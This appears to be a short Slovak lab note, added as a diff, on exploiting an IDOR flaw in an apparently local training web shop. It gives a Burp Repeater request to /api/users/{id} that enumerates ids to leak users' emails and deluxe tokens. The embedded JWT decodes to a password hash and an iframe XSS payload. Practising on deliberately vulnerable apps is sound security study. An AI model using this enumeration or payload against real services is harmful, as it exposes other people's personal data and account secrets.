@@ -1,0 +1,28 @@
+1. Spustit BURP s prehliadacom
+2. Do repeatera si dame nasledujuci request
+
+GET /api/users/{id} HTTP/1.1
+Host: localhost:3000
+sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
+Accept: application/json, text/plain, */*
+sec-ch-ua-mobile: ?0
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJtYWlsQG1haWwuY29tIiwicGFzc3dvcmQiOiI5NTVkYjBiODFlZjE5ODliNGE0ZGZlYWU4MDYxYTlhNiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiI8aWZyYW1lIHNyYz1cImphdmFzY3JpcHQ6YWxlcnQoYHhzc2ApXCI-IiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMTEtMzAgMDc6NDY6MDIuNjc0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMTEtMzAgMDc6NDg6MTYuOTg2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTcwMTMzMDUzNH0.BgEopnVDcV5DQeJ2ECseN4WoBdPz7DZVBUoIPMWhYn5zvbqeETm9dDce5cM9zvZexZoEXLYI7cPJpTAz6UbBmSw-uCAhJ6odcXdqERLpJkJcL6LWSfDE0CFrtNuLZeQ8EIyCqaY67kORjJE70G-pWSZT68swyE1WYdcb-fusUOs
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
+sec-ch-ua-platform: "macOS"
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=4JMnQw974YyRgX2lrv8bK3znLPVAo8fjdEZjmM5JxoQ6De1BqkWaNOpkvOpE
+If-None-Match: W/"8174-18bfc7202e6"
+If-Modified-Since: Thu, 23 Nov 2023 13:50:12 GMT
+Connection: close
+
+
+3. Miesto {id} vieme davat lubovolne id-cka a takto leakovat informacie o uzivateloch
+    - email
+    - deluxeToken
+
+ 
